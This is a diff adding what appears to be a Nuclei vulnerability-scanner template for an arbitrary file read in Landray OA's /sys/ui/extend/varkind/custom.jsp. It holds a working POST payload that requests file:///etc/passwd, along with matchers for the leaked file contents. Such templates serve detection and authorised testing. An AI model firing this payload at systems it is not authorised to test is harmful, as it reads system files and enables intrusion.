@@ -1,0 +1,31 @@
+id: landray-oa-custom-jsp-file-read
+info:
+  name: Landray OA Custom JSP Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,landray-oa
+http:
+  - method: POST
+    path:
+      - "/sys/ui/extend/varkind/custom.jsp"
+    headers:
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0"
+      Content-Type: "application/x-www-form-urlencoded"
+    body: |
+      var={"body":{"file":"file:///etc/passwd"}}
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "; for 16-bit app support"
+        part: body
+    extractors:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+          - "; for 16-bit app support"
